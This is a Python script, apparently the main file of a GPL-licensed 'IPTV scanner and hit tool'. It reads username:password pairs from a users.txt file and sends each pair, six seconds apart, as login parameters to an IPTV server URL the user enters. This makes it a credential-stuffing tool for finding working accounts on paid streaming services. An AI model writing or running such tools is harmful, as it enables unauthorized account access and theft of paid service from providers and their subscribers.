"""
This file is part of Scdev's iptvhit.  Scdev's iptvhit is free software: 
you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation,
either version 3 of the License, or (at your option) any later version.
Scdev's iptvhit is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.You should have received a copy of the GNU General Public License along with Scdev's iptvhit.
If not, see <https://www.gnu.org/licenses/>. 
"""

#This is IPTV SCANNER and HIT TOOL. This tool is developed by Shamika Chathuranga(SCDEV).
#This is Source Code Of SCDEV'S IPTV SCANNER VERSION 1.0.


#Import Modules ------------------------------------------------------------------------------------------
import time
from colorama import Fore, Back, Style
from core.request import send_requests
from core.common import banner


#Console GUI ---------------------------------------------------------------------------------------------
banner()
URL=input(Fore.LIGHTBLUE_EX+"Enter Server URL (starshare.live:8080): ")
print(" "*150)

with open('users.txt', 'r') as data:
  for line in data:
     parts = line.strip().split(':')
    
     username, password = parts[0], parts[1]


     time.sleep(6)  
     PARAMS = {'username':username ,'password':password , 'type': "m3u"} 


     send_requests(URL,PARAMS)

